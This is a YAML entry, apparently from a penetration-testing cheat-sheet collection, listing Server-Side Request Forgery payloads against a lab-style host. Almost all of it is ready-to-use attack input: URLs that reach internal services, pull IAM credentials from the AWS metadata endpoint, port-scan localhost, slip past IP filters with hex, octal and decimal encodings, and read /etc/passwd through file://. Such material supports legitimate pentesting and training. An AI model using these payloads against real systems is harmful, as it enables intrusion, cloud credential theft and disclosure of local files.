---
description: |
  Server-Side Request Forgery (SSRF) to access internal services, cloud metadata endpoints, and bypass network restrictions.
command: |
  # Basic SSRF — access localhost services
  http://10.10.10.27/fetch?url=http://127.0.0.1:8080
  http://10.10.10.27/fetch?url=http://127.0.0.1:3306

  # Cloud metadata endpoint (AWS)
  http://10.10.10.27/fetch?url=http://169.254.169.254/latest/meta-data/
  http://10.10.10.27/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

  # Internal port scan via SSRF
  # Enumerate internal ports by observing response time/size differences
  http://10.10.10.27/fetch?url=http://127.0.0.1:22
  http://10.10.10.27/fetch?url=http://127.0.0.1:3389
  http://10.10.10.27/fetch?url=http://127.0.0.1:6379

  # Bypass IP filters — alternative representations
  http://0x7f000001/          # hex
  http://127.1/               # shorthand
  http://[::1]/               # IPv6 localhost
  http://0177.0.0.1/          # octal
  http://2130706433/           # decimal

  # File protocol — read local files via SSRF
  http://10.10.10.27/fetch?url=file:///etc/passwd
  http://10.10.10.27/fetch?url=file:///c:/windows/win.ini
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - SSRF
references:
  - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
  - https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
---
